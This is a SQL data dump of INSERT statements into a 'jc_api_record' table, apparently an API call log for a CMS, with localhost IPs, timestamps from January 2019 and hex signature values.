INSERT INTO `jc_api_record` VALUES (826, 1, '127.0.0.1', NULL, '2019-01-03 15:23:38', 1546500218289, '66B2E8E8509695E9E6E5BD4D3D898A8A');
INSERT INTO `jc_api_record` VALUES (827, 1, '127.0.0.1', NULL, '2019-01-03 15:29:02', 1546500542738, 'F47B46F7A690C25B5A2A92E825310982');
INSERT INTO `jc_api_record` VALUES (828, 1, '127.0.0.1', NULL, '2019-01-03 15:50:20', 1546501820613, 'B35AED549B39C55A554D398D6DC28142');
INSERT INTO `jc_api_record` VALUES (829, 1, '127.0.0.1', NULL, '2019-01-03 16:33:01', 1546504381118, 'F7984A13EF09DC5833BEEA572845CB32');
INSERT INTO `jc_api_record` VALUES (830, 1, '127.0.0.1', NULL, '2019-01-03 16:37:20', 1546504640173, '97BA484A2D5A303734CA39D5A821F6A6');
INSERT INTO `jc_api_record` VALUES (831, 1, '127.0.0.1', NULL, '2019-01-03 16:51:24', 1546505484073, '307F77C676747F1A1709AD16764DE0C8');
INSERT INTO `jc_api_record` VALUES (832, 1, '127.0.0.1', NULL, '2019-01-03 16:52:27', 1546505547224, '88DAAAB9AC602FC214C6837B246B6193');
INSERT INTO `jc_api_record` VALUES (833, 1, '127.0.0.1', NULL, '2019-01-03 16:55:03', 1546505703160, '17A22ADBEC16987E4DC2D03AF43C8C78');
INSERT INTO `jc_api_record` VALUES (834, 1, '127.0.0.1', NULL, '2019-01-03 16:58:32', 1546505912686, 'EEDE8D4B64B95A63A5C42675C042219B');
INSERT INTO `jc_api_record` VALUES (835, 1, '127.0.0.1', NULL, '2019-01-03 17:02:28', 1546506148463, '7A0FB001D93D3EC773DEBF0006BC6370');
INSERT INTO `jc_api_record` VALUES (836, 1, '127.0.0.1', NULL, '2019-01-03 17:09:47', 1546506587753, 'E8176C39BE1531CF0749735A628B00EE');
INSERT INTO `jc_api_record` VALUES (837, 1, '127.0.0.1', NULL, '2019-01-04 09:53:23', 1546566803094, '320D972BECC392FCD412A8DED835AC65');
INSERT INTO `jc_api_record` VALUES (838, 1, '127.0.0.1', NULL, '2019-01-04 11:28:53', 1546572533551, 'CD16F7C440B6C862D9BCC4294D0FAEED');
INSERT INTO `jc_api_record` VALUES (839, 1, '127.0.0.1', NULL, '2019-01-04 11:31:57', 1546572717922, 'E181D7FDB375B15EE98DA09BC371C2C8');
INSERT INTO `jc_api_record` VALUES (840, 1, '127.0.0.1', NULL, '2019-01-04 13:42:34', 1546580554740, '405B3689461AF4304B952B163076CB97');
INSERT INTO `jc_api_record` VALUES (841, 1, '127.0.0.1', NULL, '2019-01-04 14:21:44', 1546582904278, '81D27753EEDE247854E170BF29AD3457');
INSERT INTO `jc_api_record` VALUES (842, 1, '127.0.0.1', NULL, '2019-01-04 14:33:08', 1546583588206, '25D2C75D17B60E618CEAFB65426AB571');
INSERT INTO `jc_api_record` VALUES (843, 1, '127.0.0.1', NULL, '2019-01-04 14:34:32', 1546583672400, 'CA5621C5EFF7315F011F2C01E9AF8F29');
INSERT INTO `jc_api_record` VALUES (844, 1, '127.0.0.1', NULL, '2019-01-04 15:29:48', 1546586988728, '4305AFF6295417F6D770A385FFEED8E2');
INSERT INTO `jc_api_record` VALUES (845, 1, '127.0.0.1', NULL, '2019-01-04 15:35:20', 1546587320971, 'B47E37D7D8810AD438B5CCA392B66C7D');
INSERT INTO `jc_api_record` VALUES (846, 1, '127.0.0.1', NULL, '2019-01-04 15:36:30', 1546587390145, '1E669E63966BCD3C3C1A30CA21759699');
INSERT INTO `jc_api_record` VALUES (847, 1, '127.0.0.1', NULL, '2019-01-04 15:38:02', 1546587482900, 'E42B28D0CE9CE72E2DA557F9E1046C96');
INSERT INTO `jc_api_record` VALUES (848, 1, '127.0.0.1', NULL, '2019-01-04 15:38:21', 1546587501891, '1ED4A5872DC5F53797E92FA7FD74A0CC');
INSERT INTO `jc_api_record` VALUES (849, 1, '127.0.0.1', NULL, '2019-01-04 15:39:51', 1546587591330, '3015FADDCA3E185B5143323174A9492E');
INSERT INTO `jc_api_record` VALUES (850, 1, '127.0.0.1', NULL, '2019-01-04 15:40:35', 1546587635709, 'D0DD6FE0B330289C0C1DDFB7257960BF');
INSERT INTO `jc_api_record` VALUES (851, 1, '127.0.0.1', NULL, '2019-01-04 15:49:36', 1546588176541, '7F603E7D372A9B49185FC1AF9D61740A');
INSERT INTO `jc_api_record` VALUES (852, 1, '127.0.0.1', NULL, '2019-01-04 15:53:10', 1546588390824, 'F32B63C03E6A71B72DE3FC7E0DC6A685');
INSERT INTO `jc_api_record` VALUES (853, 1, '127.0.0.1', NULL, '2019-01-04 16:00:24', 1546588824821, 'A4E994AE4F2B6740B26569C8C0A36727');
INSERT INTO `jc_api_record` VALUES (854, 1, '127.0.0.1', NULL, '2019-01-04 16:01:46', 1546588906495, 'D14638E43ECBE03382536AF37063C393');
INSERT INTO `jc_api_record` VALUES (855, 1, '127.0.0.1', NULL, '2019-01-04 16:02:52', 1546588972438, 'A39D394F888D5F2A36232C431EECB4F7');
INSERT INTO `jc_api_record` VALUES (856, 1, '127.0.0.1', NULL, '2019-01-04 16:10:24', 1546589424815, 'A8B5151BB3AECF7A17099C50866D1096');
INSERT INTO `jc_api_record` VALUES (857, 1, '127.0.0.1', NULL, '2019-01-04 16:18:59', 1546589939687, '2EC7B3C9BAF384E10995E21FC2783E88');
INSERT INTO `jc_api_record` VALUES (858, 1, '127.0.0.1', NULL, '2019-01-04 16:20:38', 1546590038890, '79787D14778E35AD9FDDA1F08C277D12');
INSERT INTO `jc_api_record` VALUES (859, 1, '127.0.0.1', NULL, '2019-01-04 16:25:05', 1546590305909, 'CA4F5E2B4B61EBAB0B2B1CB80604A637');
INSERT INTO `jc_api_record` VALUES (860, 1, '127.0.0.1', NULL, '2019-01-04 16:26:31', 1546590391368, '786E401365AB0D1784CCCDBC27CF10BC');
INSERT INTO `jc_api_record` VALUES (861, 1, '127.0.0.1', NULL, '2019-01-04 16:28:37', 1546590517601, '066A6C87001537F9D892FDF806FD1ACF');
INSERT INTO `jc_api_record` VALUES (862, 1, '127.0.0.1', NULL, '2019-01-04 16:31:28', 1546590688517, '603A7847AB3BF48F4AC199B1CC0A2706');
INSERT INTO `jc_api_record` VALUES (863, 1, '127.0.0.1', NULL, '2019-01-04 16:35:08', 1546590908144, 'FD7EC8221A960488110B6B5359D77CCE');
INSERT INTO `jc_api_record` VALUES (864, 1, '127.0.0.1', NULL, '2019-01-04 16:42:21', 1546591341739, '572938A44866EFCD5C27E39ED941EFA7');
INSERT INTO `jc_api_record` VALUES (865, 1, '127.0.0.1', NULL, '2019-01-04 16:53:05', 1546591985218, 'E193BB9DB935508E193AFA96EB54B0CF');
INSERT INTO `jc_api_record` VALUES (866, 1, '127.0.0.1', NULL, '2019-01-04 17:04:28', 1546592668671, '8D448AF085055BF881169CAB09D20D06');
INSERT INTO `jc_api_record` VALUES (867, 1, '127.0.0.1', NULL, '2019-01-04 17:05:02', 1546592702803, 'B6E55AFFAEDE8E30B267BBE56A0EBFB5');
INSERT INTO `jc_api_record` VALUES (868, 1, '127.0.0.1', NULL, '2019-01-04 17:06:14', 1546592774828, '2D4775FB22D8D3046758D3898BDE2855');
INSERT INTO `jc_api_record` VALUES (869, 1, '127.0.0.1', NULL, '2019-01-04 17:06:23', 1546592783168, '57C760E0DCBCE12A9D947CC807DF01CE');
INSERT INTO `jc_api_record` VALUES (870, 1, '127.0.0.1', NULL, '2019-01-04 17:06:41', 1546592801151, 'F0F33BEA86D60DDDD14CDC72D2EC538D');
INSERT INTO `jc_api_record` VALUES (871, 1, '127.0.0.1', NULL, '2019-01-04 17:07:18', 1546592838433, '3D06BD0C793E18FB9242546EBD26D3D9');
INSERT INTO `jc_api_record` VALUES (872, 1, '127.0.0.1', NULL, '2019-01-04 17:36:44', 1546594604071, 'F8256EA4458151D6B6852BFAEF3BA411');
INSERT INTO `jc_api_record` VALUES (873, 1, '127.0.0.1', NULL, '2019-01-07 09:22:37', 1546824157958, '9938195B761018AA24309F5EF7432426');
INSERT INTO `jc_api_record` VALUES (874, 1, '127.0.0.1', NULL, '2019-01-07 10:30:59', 1546828259536, '74B6EB9429D0B0E9FFB7E42BFED27B2C');
INSERT INTO `jc_api_record` VALUES (875, 1, '127.0.0.1', NULL, '2019-01-07 10:59:59', 1546829999542, '71CDCD63EC0F8AC85A42F3EDF0715791');
INSERT INTO `jc_api_record` VALUES (876, 1, '127.0.0.1', NULL, '2019-01-07 11:00:32', 1546830032011, '71CDCD63EC0F8AC85A42F3EDF0715791');
INSERT INTO `jc_api_record` VALUES (877, 1, '127.0.0.1', NULL, '2019-01-07 11:08:53', 1546830533138, '3770CA511A6299A75AA5BEA9B0841CE4');
INSERT INTO `jc_api_record` VALUES (878, 1, '127.0.0.1', NULL, '2019-01-07 11:15:16', 1546830916046, '1B6CE71305177CF324C144D7391A9A63');
INSERT INTO `jc_api_record` VALUES (879, 1, '127.0.0.1', NULL, '2019-01-07 11:17:05', 1546831025782, '5D24700AADDEAA6D3CD56CD53DD4B838');
INSERT INTO `jc_api_record` VALUES (880, 1, '127.0.0.1', NULL, '2019-01-07 11:30:26', 1546831826541, '5EE0B465221A7720E8DA52C32C395ED0');
INSERT INTO `jc_api_record` VALUES (881, 1, '127.0.0.1', NULL, '2019-01-07 11:31:14', 1546831874189, '5EE0B465221A7720E8DA52C32C395ED0');
INSERT INTO `jc_api_record` VALUES (882, 1, '127.0.0.1', NULL, '2019-01-07 13:30:51', 1546839051873, 'C353AEDDF756494CAAB2A522B2A7B6B8');
INSERT INTO `jc_api_record` VALUES (883, 1, '127.0.0.1', NULL, '2019-01-07 13:40:17', 1546839617677, '8EA9F9CEBE8CA2A76C5F83F0DD66B600');
INSERT INTO `jc_api_record` VALUES (884, 1, '127.0.0.1', NULL, '2019-01-07 13:52:29', 1546840349987, '4D9ADFAA7DC4575BFA3749420CC2CFF3');
INSERT INTO `jc_api_record` VALUES (885, 1, '127.0.0.1', NULL, '2019-01-07 14:04:00', 1546841040455, '42A0B0F0C0BB7A20D790E5EF71C452B0');
INSERT INTO `jc_api_record` VALUES (886, 1, '127.0.0.1', NULL, '2019-01-07 14:04:50', 1546841090006, '47410390D33E369CBBFA55003E096180');
INSERT INTO `jc_api_record` VALUES (887, 1, '127.0.0.1', NULL, '2019-01-07 14:11:49', 1546841509825, 'F141B303DE0F1A912137271FAA38EC80');
INSERT INTO `jc_api_record` VALUES (888, 1, '127.0.0.1', NULL, '2019-01-07 14:15:23', 1546841723682, '63A07327A3AC7F178188492B39B4C116');
INSERT INTO `jc_api_record` VALUES (889, 1, '127.0.0.1', NULL, '2019-01-07 14:20:56', 1546842056238, '76C3790AE1B9756858AFE40689129610');
INSERT INTO `jc_api_record` VALUES (890, 1, '127.0.0.1', NULL, '2019-01-07 14:56:54', 1546844214901, 'B89C8852BB2C7284092D51B25BCD7B5E');
INSERT INTO `jc_api_record` VALUES (891, 1, '127.0.0.1', NULL, '2019-01-07 15:11:44', 1546845104774, 'D565CB79E8A2821932967CD44CF659E2');
INSERT INTO `jc_api_record` VALUES (892, 1, '127.0.0.1', NULL, '2019-01-07 16:25:57', 1546849557637, '5CA79DAFDAAA601C7A762A3554DD6967');
INSERT INTO `jc_api_record` VALUES (893, 1, '127.0.0.1', NULL, '2019-01-08 10:36:46', 1546915006181, '4644D82111B4CDAF739E3A3C4BFC2F84');
INSERT INTO `jc_api_record` VALUES (894, 1, '127.0.0.1', NULL, '2019-01-08 11:30:30', 1546918230356, 'D4BD7F19A12C8DB03F9557F15743CCA7');
INSERT INTO `jc_api_record` VALUES (895, 1, '127.0.0.1', NULL, '2019-01-08 11:31:12', 1546918272176, '7A0C6ECD3451B4DC08BECABE7F957ED4');
INSERT INTO `jc_api_record` VALUES (896, 1, '127.0.0.1', NULL, '2019-01-08 13:46:12', 1546926372824, 'B541708AF83EDE51EDB6F3E7959A071F');
INSERT INTO `jc_api_record` VALUES (897, 1, '127.0.0.1', NULL, '2019-01-08 14:03:31', 1546927411698, 'A1CC616EBD4EE9C596C25CB53D397236');
INSERT INTO `jc_api_record` VALUES (898, 1, '127.0.0.1', NULL, '2019-01-08 15:08:24', 1546931304344, '94DDFA9AE1E4506040EAAEBE505CB669');
INSERT INTO `jc_api_record` VALUES (899, 1, '127.0.0.1', NULL, '2019-01-09 09:08:30', 1546996110240, '292507EB4BFFCC3EF150B76605C7A58D');
INSERT INTO `jc_api_record` VALUES (900, 1, '127.0.0.1', NULL, '2019-01-09 09:33:36', 1546997616601, 'B4BE78B10A81E0A30C1B5DDA455098AB');
INSERT INTO `jc_api_record` VALUES (901, 1, '127.0.0.1', NULL, '2019-01-09 09:35:34', 1546997734793, '12C4104AF13C509363AC973853EA7A6B');
INSERT INTO `jc_api_record` VALUES (902, 1, '127.0.0.1', NULL, '2019-01-09 10:35:06', 1547001306403, '05110EB6FDA957E91E14C839E8B537F6');
INSERT INTO `jc_api_record` VALUES (903, 1, '127.0.0.1', NULL, '2019-01-09 10:35:57', 1547001357578, '1096563A550AABFE2CDA2422F67CCBC3');
INSERT INTO `jc_api_record` VALUES (904, 1, '127.0.0.1', NULL, '2019-01-09 13:25:56', 1547011556417, '592D1AC1BCB6C0323E0EE379D92F7422');
INSERT INTO `jc_api_record` VALUES (905, 1, '127.0.0.1', NULL, '2019-01-09 13:34:30', 1547012070775, 'E02A2AFF6896EBCF8693A4C875A8DFB0');
INSERT INTO `jc_api_record` VALUES (906, 1, '127.0.0.1', NULL, '2019-01-09 13:44:41', 1547012681947, '47EE63CA40C68BF8C526D6C41C081CBB');
INSERT INTO `jc_api_record` VALUES (907, 1, '127.0.0.1', NULL, '2019-01-09 13:47:52', 1547012872168, '43D82DB7698EAC57573A9D039790824D');
INSERT INTO `jc_api_record` VALUES (908, 1, '127.0.0.1', NULL, '2019-01-09 13:48:55', 1547012935416, 'F30FF436C1E1D2BB66ECF35D2999D1CB');
INSERT INTO `jc_api_record` VALUES (909, 1, '127.0.0.1', NULL, '2019-01-09 13:50:45', 1547013045603, '38EB6A29A621BAA4DC92713F75C741CF');
INSERT INTO `jc_api_record` VALUES (910, 1, '127.0.0.1', NULL, '2019-01-09 13:55:40', 1547013340487, '97D4203B251EF3D7DC7FE677CCD7E5E5');
INSERT INTO `jc_api_record` VALUES (911, 1, '127.0.0.1', NULL, '2019-01-09 14:04:26', 1547013866500, 'E89923EF4339DF8142C65F5C6388175E');
INSERT INTO `jc_api_record` VALUES (912, 1, '127.0.0.1', NULL, '2019-01-09 14:06:55', 1547014015743, '034535FD858893A2ED3275738CFE2E6F');
INSERT INTO `jc_api_record` VALUES (913, 1, '127.0.0.1', NULL, '2019-01-09 14:39:22', 1547015962804, '2DA152AB5F6357EE3B59D257F2057C6E');
INSERT INTO `jc_api_record` VALUES (914, 1, '127.0.0.1', NULL, '2019-01-09 15:05:10', 1547017510658, '22229C9A4CB712259BD7702D6BE34BE6');
INSERT INTO `jc_api_record` VALUES (915, 1, '127.0.0.1', NULL, '2019-01-09 15:43:00', 1547019780843, 'CD209694BA0E99273AB65635613D5FC6');
INSERT INTO `jc_api_record` VALUES (916, 1, '127.0.0.1', NULL, '2019-01-09 16:11:42', 1547021502021, '812D82ACC7D7EC9ACD7F0BDDED4CDF7B');
INSERT INTO `jc_api_record` VALUES (917, 1, '127.0.0.1', NULL, '2019-01-09 16:23:38', 1547022218340, 'ECB2C9FE5FC5956A9E5F1F0B44268E73');
INSERT INTO `jc_api_record` VALUES (918, 1, '127.0.0.1', NULL, '2019-01-09 16:35:50', 1547022950646, 'CBE727F7D570AB4B5FE30BAC15B87B96');
INSERT INTO `jc_api_record` VALUES (919, 1, '127.0.0.1', NULL, '2019-01-09 16:36:27', 1547022987028, 'F06F54467578D64D6F79526FE4C5B572');
INSERT INTO `jc_api_record` VALUES (920, 1, '127.0.0.1', NULL, '2019-01-09 16:36:55', 1547023015717, 'CA4382A1B05BC71F93AF001E7A7C6691');
INSERT INTO `jc_api_record` VALUES (921, 1, '127.0.0.1', NULL, '2019-01-10 09:29:03', 1547083743916, 'FDDB9B25A8B6BCFEE88A870B437EC18F');
INSERT INTO `jc_api_record` VALUES (922, 1, '127.0.0.1', NULL, '2019-01-10 09:31:50', 1547083910687, '996D708F232806235E8D170164A37E8A');
INSERT INTO `jc_api_record` VALUES (923, 1, '127.0.0.1', NULL, '2019-01-10 09:34:53', 1547084093806, 'F9EFDDE897450688DF14AE7F7FBF7E7D');
INSERT INTO `jc_api_record` VALUES (924, 1, '127.0.0.1', NULL, '2019-01-10 09:36:55', 1547084215372, 'E19038CCDBC6A29E00AE476382596A4B');
INSERT INTO `jc_api_record` VALUES (925, 1, '127.0.0.1', NULL, '2019-01-10 09:37:26', 1547084246963, '9D71CA334841A289223059C4FED08D31');
INSERT INTO `jc_api_record` VALUES (926, 1, '127.0.0.1', NULL, '2019-01-10 09:40:09', 1547084409185, '183E1A76D27E56FBBFEEA4BA7F84DA9C');
INSERT INTO `jc_api_record` VALUES (927, 1, '127.0.0.1', NULL, '2019-01-10 09:45:25', 1547084725837, 'ABE97F276020848B6A27FC1D3F0FBFB2');
INSERT INTO `jc_api_record` VALUES (928, 1, '127.0.0.1', NULL, '2019-01-10 09:45:50', 1547084750746, '8C777BD57E00EAC0E79CEA2231418436');
INSERT INTO `jc_api_record` VALUES (929, 1, '127.0.0.1', NULL, '2019-01-10 09:55:08', 1547085308756, 'A378FF53099D20F811A59586375B8D07');
INSERT INTO `jc_api_record` VALUES (930, 1, '127.0.0.1', NULL, '2019-01-10 09:59:46', 1547085586627, '6887E7D11B898FC5AE163410EC019A68');
INSERT INTO `jc_api_record` VALUES (931, 1, '127.0.0.1', NULL, '2019-01-10 10:28:32', 1547087312927, 'C5E3A05B1DB2A8246BABD014538719AF');
INSERT INTO `jc_api_record` VALUES (932, 1, '127.0.0.1', NULL, '2019-01-10 10:33:50', 1547087630279, '97BE0E8C826C808EB0659E56C935DA36');
INSERT INTO `jc_api_record` VALUES (933, 1, '127.0.0.1', NULL, '2019-01-10 10:34:26', 1547087666342, '83FE667EC6B5AE6465B905E4554AD47B');
INSERT INTO `jc_api_record` VALUES (934, 1, '127.0.0.1', NULL, '2019-01-10 10:35:07', 1547087707287, '205EA35BD0CD4C48E80DB6D254222155');
INSERT INTO `jc_api_record` VALUES (935, 1, '127.0.0.1', NULL, '2019-01-10 10:36:31', 1547087791281, 'FB17547C720BF10AB7EEAC9A72EE1DCF');
INSERT INTO `jc_api_record` VALUES (936, 1, '127.0.0.1', NULL, '2019-01-10 10:48:11', 1547088491968, '4A27AEE23D5177EB9CB0A83F958FF6CA');
INSERT INTO `jc_api_record` VALUES (937, 1, '127.0.0.1', NULL, '2019-01-10 11:10:01', 1547089801114, 'D3ADA3C901D58C266A42D2E06977B196');
INSERT INTO `jc_api_record` VALUES (938, 1, '127.0.0.1', NULL, '2019-01-10 14:13:45', 1547100825192, 'F82AEDE09F34FE75F7B2BC5924244702');
INSERT INTO `jc_api_record` VALUES (939, 1, '127.0.0.1', NULL, '2019-01-10 15:47:45', 1547106465027, '2C1C6BFEDD1549D14102E7B6344DABB4');
INSERT INTO `jc_api_record` VALUES (940, 1, '127.0.0.1', NULL, '2019-01-10 16:03:11', 1547107391362, 'A788C8BCB05EF6C1EABB385B9DB23EA4');
INSERT INTO `jc_api_record` VALUES (941, 1, '127.0.0.1', NULL, '2019-01-10 16:07:38', 1547107658860, '3A46D5440FB22AD1B0D64DBB9783007B');
INSERT INTO `jc_api_record` VALUES (942, 1, '127.0.0.1', NULL, '2019-01-10 16:30:15', 1547109015384, '09E0FE7FA56D60D094A5B85B007FFA32');
INSERT INTO `jc_api_record` VALUES (943, 1, '127.0.0.1', NULL, '2019-01-10 16:37:07', 1547109427281, 'A6FAD3CFE1F0896A02BC42D5BE17FB49');
INSERT INTO `jc_api_record` VALUES (944, 1, '127.0.0.1', NULL, '2019-01-10 16:45:49', 1547109949964, '652A6FAAE8EE2F829ED90BD392ABB3E6');
INSERT INTO `jc_api_record` VALUES (945, 1, '127.0.0.1', NULL, '2019-01-10 16:50:56', 1547110256271, '295E263CEB177E932099AE1257932C89');
INSERT INTO `jc_api_record` VALUES (946, 1, '127.0.0.1', NULL, '2019-01-10 16:54:02', 1547110442754, 'C6DE3BFCE8F5B47BB8092E48972EE176');
INSERT INTO `jc_api_record` VALUES (947, 1, '127.0.0.1', NULL, '2019-01-10 17:02:35', 1547110955890, '40F692AEB20DBD8A3EA9C07DF42CFE51');
INSERT INTO `jc_api_record` VALUES (948, 1, '127.0.0.1', NULL, '2019-01-10 17:04:22', 1547111062759, '3EA6B391CCA5147451AA5FB9A9CDB9F6');
INSERT INTO `jc_api_record` VALUES (949, 1, '127.0.0.1', NULL, '2019-01-10 17:06:02', 1547111162069, '611BAC5E17A9E7C7C5454760D8FEB73B');
INSERT INTO `jc_api_record` VALUES (950, 1, '127.0.0.1', NULL, '2019-01-10 17:11:22', 1547111482440, 'A123C66CEBB306373D9BC9D60D203F49');
INSERT INTO `jc_api_record` VALUES (951, 1, '127.0.0.1', NULL, '2019-01-10 17:12:32', 1547111552875, 'EEDA549E3CBF065C0FB55EBF3CA6BCE5');
INSERT INTO `jc_api_record` VALUES (952, 1, '127.0.0.1', NULL, '2019-01-10 17:36:36', 1547112996837, 'BEE5BC766D493C6584765381F510D2FB');
INSERT INTO `jc_api_record` VALUES (953, 1, '127.0.0.1', NULL, '2019-01-11 09:19:57', 1547169597844, 'C3AD1B12F0D1ED5C2F25B031C68D5F8F');
INSERT INTO `jc_api_record` VALUES (954, 1, '127.0.0.1', NULL, '2019-01-11 09:27:11', 1547170031751, '56D2C9B9B83C6533C80F52AEE7625DDF');
INSERT INTO `jc_api_record` VALUES (955, 1, '127.0.0.1', NULL, '2019-01-11 09:28:58', 1547170138767, 'CE403B0E11C435FF1D383E6B28EB8B23');
INSERT INTO `jc_api_record` VALUES (956, 1, '127.0.0.1', NULL, '2019-01-11 09:44:25', 1547171065452, '62F187404B6CA3939C44489C5EA2FA57');
INSERT INTO `jc_api_record` VALUES (957, 1, '127.0.0.1', NULL, '2019-01-11 10:01:15', 1547172075592, '6F827F69C19170D1FF5D1F24F30B308D');
INSERT INTO `jc_api_record` VALUES (958, 1, '127.0.0.1', NULL, '2019-01-11 10:02:23', 1547172143834, 'D03D0E6C5FBE4A451365EE66B6A2A4AF');
INSERT INTO `jc_api_record` VALUES (959, 1, '127.0.0.1', NULL, '2019-01-11 10:40:20', 1547174420512, '676371E13C356C8BD7052D4464FC3C23');
INSERT INTO `jc_api_record` VALUES (960, 1, '127.0.0.1', NULL, '2019-01-11 11:03:29', 1547175809334, '9E324DF4CA1284E24E31F8210D08FC73');
INSERT INTO `jc_api_record` VALUES (961, 1, '127.0.0.1', NULL, '2019-01-11 11:38:46', 1547177926659, 'B0C20AD6925EF6774C41F09FB0EE167E');
INSERT INTO `jc_api_record` VALUES (962, 1, '127.0.0.1', NULL, '2019-01-11 13:37:59', 1547185079948, '4EC044E9E97C6BA21EAA4905E656DBE9');
INSERT INTO `jc_api_record` VALUES (963, 1, '127.0.0.1', NULL, '2019-01-11 13:57:37', 1547186257320, '8EC8A20FEDD00FDF702963B8480F13C3');
INSERT INTO `jc_api_record` VALUES (964, 1, '127.0.0.1', NULL, '2019-01-11 14:37:16', 1547188636973, '8ABABEDD8BE481EB4A9665820B209682');
INSERT INTO `jc_api_record` VALUES (965, 1, '127.0.0.1', NULL, '2019-01-11 14:57:03', 1547189823902, '1C32487475BE26348193B571F4E6B7AF');
INSERT INTO `jc_api_record` VALUES (966, 1, '127.0.0.1', NULL, '2019-01-11 14:57:45', 1547189865422, 'A422025E21663C7A10D781D0882C86B4');
INSERT INTO `jc_api_record` VALUES (967, 1, '127.0.0.1', NULL, '2019-01-11 14:57:54', 1547189874065, '2C8DDF08830755647DCCD0719405637C');
INSERT INTO `jc_api_record` VALUES (968, 1, '127.0.0.1', NULL, '2019-01-11 17:17:34', 1547198254937, 'D9A69DE3834F809244E7CED743459D78');
INSERT INTO `jc_api_record` VALUES (969, 1, '127.0.0.1', NULL, '2019-01-11 17:27:13', 1547198833046, 'C8D6E5CDD7A9C7CE992FEEA8915908AB');
INSERT INTO `jc_api_record` VALUES (970, 1, '127.0.0.1', NULL, '2019-01-13 18:46:06', 1547376366181, 'D03A9EE6DA68C4EC80E4EA95637D4293');
INSERT INTO `jc_api_record` VALUES (971, 1, '127.0.0.1', NULL, '2019-01-14 09:27:55', 1547429275569, 'F195FB3F5CA5FC4F578C2866CB396E3F');
INSERT INTO `jc_api_record` VALUES (972, 1, '127.0.0.1', NULL, '2019-01-14 09:35:28', 1547429728781, 'BD109E3DB552AD719F6EFD9B9012AE2E');
INSERT INTO `jc_api_record` VALUES (973, 1, '127.0.0.1', NULL, '2019-01-14 09:38:24', 1547429904149, 'C2E8D13CDE0B37C3C7306C147F1CBAB9');
INSERT INTO `jc_api_record` VALUES (974, 1, '127.0.0.1', NULL, '2019-01-14 13:34:02', 1547444042920, 'B2278BB10798073F538BE646B403A679');
INSERT INTO `jc_api_record` VALUES (975, 1, '127.0.0.1', NULL, '2019-01-14 16:07:08', 1547453228505, '040AD1E55A9E54EAC0328171FA5362B2');
INSERT INTO `jc_api_record` VALUES (976, 1, '127.0.0.1', NULL, '2019-01-14 16:38:55', 1547455135867, '6B93ADCA9AE4D59174E4E894B085345B');
INSERT INTO `jc_api_record` VALUES (977, 1, '127.0.0.1', NULL, '2019-01-15 09:35:56', 1547516156945, '16CB1DE3DD79A5CAA213F48B0D6CC301');
INSERT INTO `jc_api_record` VALUES (978, 1, '127.0.0.1', NULL, '2019-01-15 09:52:12', 1547517132643, 'C1B1D85679F0C694AB02E32E1C5A815A');
INSERT INTO `jc_api_record` VALUES (979, 1, '127.0.0.1', NULL, '2019-01-15 10:14:36', 1547518476657, 'B5E66F95266A50C940DB488A3FE694B9');
INSERT INTO `jc_api_record` VALUES (980, 1, '127.0.0.1', NULL, '2019-01-15 10:16:24', 1547518584858, '07248A54B688E3C76A072BB3FC3A4C3E');
INSERT INTO `jc_api_record` VALUES (981, 1, '127.0.0.1', NULL, '2019-01-15 10:16:59', 1547518619253, '922F1DEECF9EDB1CB1D18AE54AC102DD');
INSERT INTO `jc_api_record` VALUES (982, 1, '127.0.0.1', NULL, '2019-01-15 10:17:13', 1547518633435, '58878A45D839F1A3BA32D08A6EA95BC7');
INSERT INTO `jc_api_record` VALUES (983, 1, '127.0.0.1', NULL, '2019-01-15 10:21:14', 1547518874182, '7E934F3D03B057F9B251CD19C58CB2D6');
INSERT INTO `jc_api_record` VALUES (984, 1, '127.0.0.1', NULL, '2019-01-15 10:21:49', 1547518909826, '6F0CCE5BAB9FC1389436462A0A23ACDA');
INSERT INTO `jc_api_record` VALUES (985, 1, '127.0.0.1', NULL, '2019-01-15 10:22:24', 1547518944359, '8547F5DE74C5312718CB4B41FE0182B8');
INSERT INTO `jc_api_record` VALUES (986, 1, '127.0.0.1', NULL, '2019-01-15 10:24:00', 1547519040671, 'A212CDEA84878C5BFFE94E029076A3EF');
INSERT INTO `jc_api_record` VALUES (987, 1, '127.0.0.1', NULL, '2019-01-15 10:37:12', 1547519832126, '9C7C1A1A7B6F16BC4DF7B07D3AD84B54');
INSERT INTO `jc_api_record` VALUES (988, 1, '127.0.0.1', NULL, '2019-01-15 10:40:43', 1547520043672, '4BA79C6874E0AA316926AB4960AE750E');
INSERT INTO `jc_api_record` VALUES (989, 1, '127.0.0.1', NULL, '2019-01-15 10:44:03', 1547520243834, '14B4BADCD033C5723218A2A732499EDD');
INSERT INTO `jc_api_record` VALUES (990, 1, '127.0.0.1', NULL, '2019-01-15 10:44:35', 1547520275928, 'B1C51C4130F1B9062EA5B6A01B13352C');
INSERT INTO `jc_api_record` VALUES (991, 1, '127.0.0.1', NULL, '2019-01-15 10:52:11', 1547520731256, 'A13DBBACE210B00F50C5E1E7C199352F');
INSERT INTO `jc_api_record` VALUES (992, 1, '127.0.0.1', NULL, '2019-01-15 10:57:13', 1547521033995, 'DBFA1023F19C29C639EDA5B25B9B7370');
INSERT INTO `jc_api_record` VALUES (993, 1, '127.0.0.1', NULL, '2019-01-15 10:59:04', 1547521144952, 'BEDA64C4B5324E216B72D54C891CA767');
INSERT INTO `jc_api_record` VALUES (994, 1, '127.0.0.1', NULL, '2019-01-15 11:01:10', 1547521270947, '14C461DD5E0FF5338CE3C2F53360B198');
INSERT INTO `jc_api_record` VALUES (995, 1, '127.0.0.1', NULL, '2019-01-15 11:03:17', 1547521397412, 'B8AF4D11A201DCE04C5A203D312241E7');
INSERT INTO `jc_api_record` VALUES (996, 1, '127.0.0.1', NULL, '2019-01-15 11:06:00', 1547521560721, 'C49AF6BF4D4D5F1822886B9A9FBA912E');
INSERT INTO `jc_api_record` VALUES (997, 1, '127.0.0.1', NULL, '2019-01-15 11:08:05', 1547521685602, '5D3EA37A24E697C5CBDC5DCF5BDF02E7');
INSERT INTO `jc_api_record` VALUES (998, 1, '127.0.0.1', NULL, '2019-01-15 11:10:00', 1547521800265, '853F8E08189D7F62712811636B6037A1');
INSERT INTO `jc_api_record` VALUES (999, 1, '127.0.0.1', NULL, '2019-01-15 11:11:51', 1547521911862, 'E7688ABDC7E53B5ACCA87483A69385DC');
INSERT INTO `jc_api_record` VALUES (1000, 1, '127.0.0.1', NULL, '2019-01-15 11:12:11', 1547521931549, '19CDE4A689E3840B61E931469205C5C7');
INSERT INTO `jc_api_record` VALUES (1001, 1, '127.0.0.1', NULL, '2019-01-15 11:12:57', 1547521977617, '991369276265A9306474F86B26AFC594');
